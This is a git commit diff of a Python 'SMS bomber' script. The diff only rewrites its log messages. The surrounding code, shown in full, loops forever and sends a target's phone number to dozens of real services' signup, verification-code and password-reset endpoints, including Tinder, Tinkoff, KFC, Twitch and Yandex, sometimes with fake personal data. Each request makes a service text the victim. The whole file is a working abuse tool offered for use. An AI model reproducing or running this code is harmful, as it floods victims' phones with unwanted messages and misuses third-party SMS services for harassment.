ac64c25d060980cfaca37b493004d2af20fca624
Harun MISTIK <60209401+demoza@users.noreply.github.com>
2020-01-28 12:26:22 +0300

    Add files via upload

--- sms.py
+++ sms.py
@@ -92,294 +92,294 @@ while True:
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 		print('[+] Grab Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Grab Requests Failed!')
 
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 		print('[+] RuTaxi Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] RuTaxi Requests Failed!')
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 		print('[+] BelkaCar Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] BelkaCar Requests Failed!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 		print('[+] Tinder Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Tinder Requests Failed!')
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 		print('[+] Karusel Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Karusel Requests Failed!')
 
 	try:
 		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 		print('[+] Tinkoff Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Tinkoff Requests Failed!')
 
 	try:
 		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
 		print('[+] MTS Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] MTS Requests Failed!')
 
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 		print('[+] Youla Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Youla Requests Failed!')
 
 	try:
 		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 		print('[+] PizzaHut Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] PizzaHut Requests Failed!')
 
 	try:
 		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 		print('[+] Rabota Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Rabota Requests Failed!')
 
 	try:
 		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 		print('[+] Smsint Requests Successful!')
 	except:
-		print('[-] Requests Failed!')
+		print('[-] Smsint Requests Failed!')
 
 	try:
 		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
 		print('[+] oyorooms Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] oyorooms Requests Failed!')
 
 	try:
 		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
 		print('[+] MVideo Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] MVideo Requests Failed!')
 
 	try:
 		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
 		print('[+] newnext Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] newnext Requests Failed!')
 
 	try:
 		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
 		print('[+] Sunlight Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Sunlight Requests Failed!')
 
 	try:
 		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
 		print('[+] alpari Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] alpari Requests Failed!')
 
 	try:
 		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 		print('[+] Invitro Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Invitro Requests Failed!')
 
 	try:
 		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
 		print('[+] Sberbank Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Sberbank Requests Failed!')
 
 	try:
 		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
 		print('[+] Psbank Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Psbank Requests Failed!')
 
 	try:
 		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 		print('[+] Beltelcom Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Beltelcom Requests Failed!')
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
 		print('[+] Karusel Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Karusel Requests Failed!')
 
 	try:
 		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
 		print('[+] KFC Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] KFC Requests Failed!')
 
 	try:
 		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
 		print('[+] carsmile Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] carsmile Requests Failed!')
 
 	try:
 		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
 		print('[+] Citilink Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Citilink Requests Failed!')
 
 	try:
 		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
 		print('[+] Delitime Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Delitime Requests Failed!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('[+] findclone Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] findclone Requests Failed!')
 
 	try:
 		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
 		print('[+] Guru Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Guru Requests Failed!')
 
 	try:
 		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
 		print('[+] ICQ Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] ICQ Requests Failed!')
 
 	try:
 		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
 		print('[+] InDriver Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] InDriver Requests Failed!')
 
 	try:
 		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
 		print('[+] Invitro Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Invitro Requests Failed!')
 
 	try:
 		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
 		print('[+] Pmsm Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Pmsm Requests Failed!')
 
 	try:
 		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
 		print('[+] IVI Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] IVI Requests Failed!')
 
 	try:
 		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
 		print('[+] Lenta Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Lenta Requests Failed!')
 
 	try:
 		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
 		print('[+] Mail.ru Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Mail.ru Requests Failed!')
 
 	try:
 		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
 		print('[+] MVideo Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] MVideo Requests Failed!')
 
 	try:
 		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
 		print('[+] OK Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] OK Requests Failed!')
 
 	try:
 		requests.post('https://plink.tech/register/',json={"phone": _phone})
 		print('[+] Plink Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Plink Requests Failed!')
 
 	try:
 		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
 		print('[+] qlean Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] qlean Requests Failed!')
 
 	try:
 		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
 		print('[+] SMSgorod Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] SMSgorod Requests Failed!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
 		print('[+] Tinder Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Tinder Requests Failed!')
 
 	try:
 		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
 		print('[+] Twitch Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Twitch Requests Failed!')
 
 	try:
 		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
 		print('[+] CabWiFi Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] CabWiFi Requests Failed!')
 
 	try:
 		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
 		print('[+] wowworks Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] wowworks Requests Failed!')
 
 	try:
 		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
 		print('[+] Eda.Yandex Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Eda.Yandex Requests Failed!')
 
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 		print('[+] Youla Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Youla Requests Failed!')
 
 	try:
 		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
 		print('[+] Alpari Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Alpari Requests Failed!')
 
 	try:
 		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
 		print('[+] SMS Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] SMS Requests Failed!')
 
 	try:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
 		print('[+] Delivery Requests Successful!')
 	except:
-		print('[-]   Requests Failed!')
+		print('[-] Delivery Requests Failed!')
 
 
 
 	try:
 		iteration += 1
-		print(('{} the tour is complete.').format(iteration))
+		print(('{}completed tours = ').format(iteration))
 	except:
 		break
